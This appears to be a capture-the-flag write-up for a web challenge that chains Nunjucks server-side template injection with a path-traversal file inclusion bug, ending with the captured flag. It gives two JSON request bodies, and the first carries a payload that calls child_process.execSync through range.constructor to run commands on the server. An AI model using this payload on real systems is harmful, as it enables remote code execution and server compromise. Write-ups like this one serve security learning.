SSTI with nunjucks
The application renders the code the user submits before saving it to a file. There is also a LFI vulnerability that allows us to render our own files. 

As such, first write your SSTI payload to a file. As the loaded file needs to have the njk extension, we ensure our payload accounts for that
```json
{"pickup":"123456.njk{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail flag.txt')\")()}}","pickupNum":2}
```

Then, render the file using the LFI vulnerability
```json
{"pickup":"123456.njk{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail flag.txt')\")()}}","pickupNum":"/../../user_compliments/22696bfbbd71e2b0a16ce6e1801bdc7e_123456"}
```

Flag
```YBN24{MAstER_P1ckUP_aRt!St}```